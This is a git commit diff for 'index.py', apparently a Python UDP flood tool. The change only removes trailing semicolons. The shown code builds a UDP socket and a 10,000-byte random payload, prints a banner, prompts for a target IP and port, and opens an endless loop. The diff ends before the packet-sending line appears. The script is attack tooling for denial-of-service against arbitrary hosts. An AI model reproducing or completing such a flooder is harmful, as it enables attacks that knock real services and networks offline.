00fafd78f0c96aab4006da3760f45b53c64668e6
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 17:19:31 +0300

    Update index.py

--- index.py
+++ index.py
@@ -1,19 +1,19 @@
-import sys;
-import os;
-import time;
-import socket;
-import random;
-from datetime import datetime;
-now = datetime.now();
-hour = now.hour;
-minute = now.minute;
-day = now.day;
-month = now.month;
-year = now.year;
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
-bytes = random._urandom(10000);
-timeout =  time.time();
-os.system ("clear");
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(10000)
+timeout = time.time()
+os.system ("clear")
 print ('''
 \033[91m
  ______   _______  _______  _______  _______  _______ 
@@ -23,10 +23,10 @@ print ('''
 | |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
-''');
-ip = raw_input("IP: ");
-port = input("Port: ");
-os.system("clear");
+''')
+ip = raw_input("IP: ")
+port = input("Port: ")
+os.system("clear")
 sent = 0
 while True:
   while 1:
